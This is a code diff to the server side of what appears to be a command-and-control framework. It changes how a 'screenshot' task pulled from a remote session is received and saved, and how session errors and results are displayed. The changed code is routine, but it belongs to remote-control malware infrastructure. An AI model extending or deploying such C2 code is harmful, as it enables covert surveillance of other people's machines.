@@ -383,7 +383,7 @@ class C2():
                 try:
                     self._print(json.loads(info))
                 except:
-                    util.display(str(info), color=self._text_color, style=self._text_style)
+                    util.display(info, color=self._text_color, style=self._text_style)
             else:
                 util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
             print
@@ -580,23 +580,23 @@ class C2():
         else:
             task = {"task": "screenshot", "session": self.current_session.info.get('uid')}
             self.current_session.send_task(task)
-            time.sleep(2) # FIX ME: this seems to be needed for local testing?
-            output = self.current_session.recv_task()['result']
-            if not os.path.isdir('data'):
+            response = self.current_session.recv_task()
+            if isinstance(response, dict):
+                if not os.path.isdir('data'):
+                    try:
+                        os.mkdir('data')
+                    except OSError:
+                        util.log("Unable to create directory 'data' (permission denied)")
+                        return
+                filename = 'data/{}.png'.format(str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]))
                 try:
-                    os.mkdir('data')
-                except OSError:
-                    util.log("Unable to create directory 'data' (permission denied)")
-                    return
-            filename = 'data/{}.png'.format(str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]))
-            try:
-                with open(filename, 'wb') as fp:
-                    fp.write(base64.decodebytes(output.encode()))
-            except Exception as e:
-                print(e)
-
-            return filename
-
+                    with open(filename, 'wb') as fp:
+                        fp.write(base64.decodebytes(response['result'].encode()))
+                except Exception as e:
+                    print(e)
+                return filename
+            else:
+                return str(response)
 
     def session_remove(self, session_id):
         """ 
@@ -926,8 +926,7 @@ class Session(threading.Thread):
                 # empty header; peer down, scan or recon. Drop.
                 return 0
         except Exception as e:
-            print(e)
-            return 0
+            return str(e)
 
     def run(self):
         """ 
@@ -953,7 +952,7 @@ class Session(threading.Thread):
                             result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
                             if result:
                                 task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
-                                globals()['c2'].display(result.encode())
+                                globals()['c2'].display(result)
                                 globals()['c2'].database.handle_task(task)
                             continue
                         else:
